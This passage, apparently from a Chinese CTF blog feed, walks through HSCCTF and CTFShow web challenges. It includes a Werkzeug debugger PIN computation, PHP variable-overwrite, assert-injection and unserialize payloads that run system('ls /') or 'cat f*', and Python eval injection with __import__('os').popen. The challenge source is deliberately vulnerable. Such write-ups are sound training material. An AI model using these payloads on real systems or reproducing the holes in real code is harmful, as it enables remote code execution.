class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(get_pin_and_cookie_name())</span><br><span class="line"></span><br><span class="line"><span class="comment">#output:(&#x27;819-831-805&#x27;, &#x27;__wzd610d82b2b1acb431a87b&#x27;)</span></span><br></pre></td></tr></table></figure><p>直接复制<code>819-831-805</code>即可，有时候不能认证，尝试重新打开一下页面即可</p><img src="/2023/02/19/HSCCTF-2th-WriteUp/6.png" class title="fwf"><p>获取到控制台了</p><p>那直接想怎么做就怎么做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="comment">#查看目录</span></span><br></pre></td></tr></table></figure><img src="/2023/02/19/HSCCTF-2th-WriteUp/7.png" class title="gwg"><p>发现flag和readflag</p><p>先查看flag，是空的</p><p>然后查看readflag获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;/readflag&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;HSCSEC&#123;492dbc97-e92c-447a-9703-928c1435eeff&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;又被薄纱了，哈哈哈&lt;/p&gt;</summary>
    
    
    
    <category term="CTF WriteUp" scheme="http://example.com/categories/CTF-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CTFShow 菜狗杯</title>
    <link href="http://example.com/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/"/>
    <id>http://example.com/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/</id>
    <published>2023-01-29T03:26:32.000Z</published>
    <updated>2023-03-12T09:43:56.840Z</updated>
    
    <content type="html"><![CDATA[<p>做做菜狗杯的题（主要是web）</p><span id="more"></span><h1><span id="web签到"> Web签到</span></h1><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 09:38:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure><p>这个刚开始看的时候可能头很大，实际上就是变量的嵌套</p><p>由里到外传参即可：</p><p>第一层是cookie传参：名为CTFshow-QQ群: 值为1</p><p>这样就变成了<code>eval($_REQUEST[$_GET[$_POST[1]]])</code></p><p>相当于让我们POST 名为1的值</p><p>此时令1=2</p><p>变成<code>eval($_REQUEST[$_GET[2]])</code></p><p>同上，get传参2=3</p><p>最后的request用任意方式传参即可，注意后面的中括号</p><p><code>3[6][0][7][5][8][0][9][4][4]=system('ls /');</code></p><p>注意中文需要url编码</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/1.png" class title="awa"><p>发现f1agaaa，直接<code>cat /f1agaaa</code>即可</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/2.png" class title="bwb"><h1><span id="web2-c0me_t0_s1gn"> web2 c0me_t0_s1gn</span></h1><p>提示：the page hide something you need use the god’s eye to find</p><p>使用F12发现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ok you find something a part of flag :ctfshow&#123;We1c0me_ --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--and thre is a hint for another one: can can need 控制台(console)--&gt;</span></span><br></pre></td></tr></table></figure><p>提示我们看看控制台：</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/3.png" class title="cwc"><p>运行这个函数即可获得flag</p><p>直接控制台输入<code>g1ve_flag()</code></p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/4.png" class title="dwd"><h1><span id="我的眼里只有"> 我的眼里只有$</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 08:21:54</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>非常简单的代码，通过POST请求覆盖变量：</p><p>一共有36个$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/5.png" class title="ewe"><p>所以直接cat /f*即可</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/6.png" class title="fwf"><h1><span id="一言既出驷马难追"> 一言既出+驷马难追</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//如果传入num=114514 进行assert判断，如果num=1919810输出flag</span></span><br><span class="line"><span class="comment">//否则echo 一言既出驷马难追</span></span><br></pre></td></tr></table></figure><p>这个题可以有两种方法：</p><p>1.将后面的内容注释掉（通过注释符，因为没有对输入进行过滤）</p><p>只需要将==1919810及其后面的内容注释掉即可</p><p><code>?num=114514);//</code></p><p>传入后assert内容变为了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(114514);//)==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>也就是intval 114514 然后输出flag</p><p>2.assert()类似于eval()，可以执行加减乘除</p><p>所以只需要114514+1805296即可</p><p>加号需要url编码</p><p><code>?num=114514%2B1805296</code></p><p>（驷马难追中使用）</p><h1><span id="taptaptap"> TapTapTap</span></h1><p>js游戏题，关注：</p><ul><li>1.js是否有alert</li><li>2.游戏取得胜利的条件</li><li>3.角色参数（</li></ul><p>在<code>/js/habibiScript.js</code>中找到<code>alert(atob('WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ='));</code></p><p>通过base64解码得到</p><p><code>Your flag is in /secret_path_you_do_not_know/secretfile.txt</code></p><p>直接访问获得flag</p><h1><span id="webshell"> WebShell</span></h1><p>非常简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$serializecmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$unserializecmd</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializecmd</span>);</span><br><span class="line">        <span class="variable">$unserializecmd</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只需注意过滤了flag即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Webshell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;cat f*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Webshell</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#output:O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;cat f*&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>执行后打开f12即可看到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:14:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:14:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;ctfshow&#123;69945a58-c85d-405a-8984-30de8ed48c3a&#125;&#x27;</span>;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h1><span id="化零为整"> 化零为整</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;<span class="comment">//计算get传参的个数</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;<span class="comment">//每个get传参的内容的长度&lt;1</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你太长了！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];<span class="comment">//然后拼接结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;大牛&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这个题目就是让我们通过多次get传参拼接出大牛</p><p>由于每一个url编码长度只占1</p><p>所以我们可以将大牛进行url编码，每一个get传参只传递其中一个编码，拼接后解码就能组成大牛</p><p><code>将大牛url编码：%E5%A4%A7%E7%89%9B</code></p><p>传入<code>?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code>即可</p><h1><span id="无一幸免"> 无一幸免</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不是很懂，get随便传都行</p><p><code>?0=</code>即可</p><h1><span id="传说之下雾"> 传说之下（雾）</span></h1><p>还是js小游戏</p><p>直接看看js：</p><p>这里没有alert什么的输出条件…</p><p>就看看分数，发现<code>var nowScore = this.score += 1</code></p><p>就是每吃一个苹果得到1分</p><p>我们直接改成2077+就行了</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/7.png" class title="gwg"><p>控制台输出flag</p><h1><span id="算力超群"> 算力超群</span></h1><p>打开是个计算器</p><p>但是随便输点算术没有其他的回显</p><p>打开burp抓个包</p><p>抓到了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_calculate?number1=9&amp;operator=*&amp;number2=9 HTTP/1.1</span><br></pre></td></tr></table></figure><p>接下来对这三个参数进行修改：</p><p>删除number1的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_calculate?number1=&amp;operator=*&amp;number2=9 HTTP/1.1</span><br></pre></td></tr></table></figure><p>页面报错，<a href="http://xn--app-vw3es35fvqs.py">发现是app.py</a>(flask)</p><p>并且最后的内容是eval函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;,line 28, in calculate</span><br><span class="line">result = eval(a + operator + b)</span><br></pre></td></tr></table></figure><p>说明我们可以对传入的参数进行修改执行命令（</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_calculate?number1=1&amp;operator=*&amp;number2=__import__(&#x27;os&#x27;).popen(&#x27;cat%20/f*&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;result&quot;: &quot;ctfshow&#123;f401308c-de9e-4482-a57b-a6432f3870dd&#125;\n&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="算力升级"> 算力升级</span></h1><p>仅能使用gmpy2库的函数进行注入</p><p>查看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：算力升级--这其实是一个pyjail题目</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re,gmpy2 </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pattern=re.<span class="built_in">compile</span>(<span class="string">r&#x27;\w+&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiesuanzi</span>():</span><br><span class="line">    code=request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):<span class="comment">#从code里把单词拿出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+$&#x27;</span>,item):<span class="comment">#如果不是数字</span></span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):<span class="comment">#逐个和gmpy2库里的函数名比较</span></span><br><span class="line">               <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;你想干什么？<span class="subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=<span class="built_in">eval</span>(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;计算成功，答案是<span class="subst">&#123;result&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;没有执行成功，请检查你的输入。&quot;</span>&#125;)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span 